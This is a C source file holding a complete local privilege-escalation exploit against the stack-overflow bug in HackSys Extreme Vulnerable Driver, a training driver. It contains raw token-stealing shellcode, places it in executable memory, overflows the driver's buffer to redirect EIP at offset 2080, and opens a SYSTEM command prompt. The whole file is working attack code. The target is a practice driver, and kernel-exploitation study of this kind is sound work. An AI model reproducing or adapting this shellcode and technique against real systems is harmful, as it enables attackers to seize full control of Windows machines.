#include <stdio.h>
#include <Windows.h>

// Set IO_CODE for the Stack Overflow Vulnerability
#define IO_CODE 0x222003

int main(int argc, char* argv[]) {

	// Declare 'shellcode' variable and store Tokenstealing shellcode
	char shellcode[] = "\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x61\x31\xc0\x5d\xc2\x08\x00";

	// Call VirtualAlloc() and move tokenstealing shellcode into the memory space with a RtlMoveMemory() call
	LPVOID Alloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!Alloc) {
		printf("[-] Error - Unable to allocate shellcode.\n");
		exit(1);
	}

	RtlMoveMemory(Alloc, shellcode, sizeof(shellcode));

	// Call CreateFileA() to interact with vulnerable "\\\\.\\HackSysExtremeVulnerableDriver" driver
	HANDLE vulnDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, NULL, 0x3, 0, NULL);

	// Validate interaction with vulnerable "\\\\.\\HackSysExtremeVulnerableDriver" driver
	if (vulnDevice == INVALID_HANDLE_VALUE) {
		printf("[-] Error - Unable to get driver handle.\n");
		exit(1);
	}
	printf("[+] Successfully created file.\n");

	// Declare 'bytesRetn' variable for 'DeviceIoControl -> lpBytesReturned' parameter
	DWORD bytesRetn;

	// Set 'expl' variable to cause crash 
	char expl[2084];

	// Set 'offset' variable to control EIP
	const size_t offset = 2080;

	// Fill 'expl' variable with 'A' * 'offset'
	memset(expl, 'A', offset);
	// Move tokenstealing shellcode into 'expl' variable to overwrite EIP
	memcpy(&expl[offset], &Alloc, 0x4);

	// Send 'expl' variable to vulnerable "\\\\.\\HackSysExtremeVulnerableDriver" driver
	DeviceIoControl(vulnDevice, IO_CODE, expl, sizeof(expl), NULL, 0, &bytesRetn, NULL);

	// Obtain 'NT AUTHORITY\SYSTEM' command prompt
	system("cmd.exe");

	return 0;
}
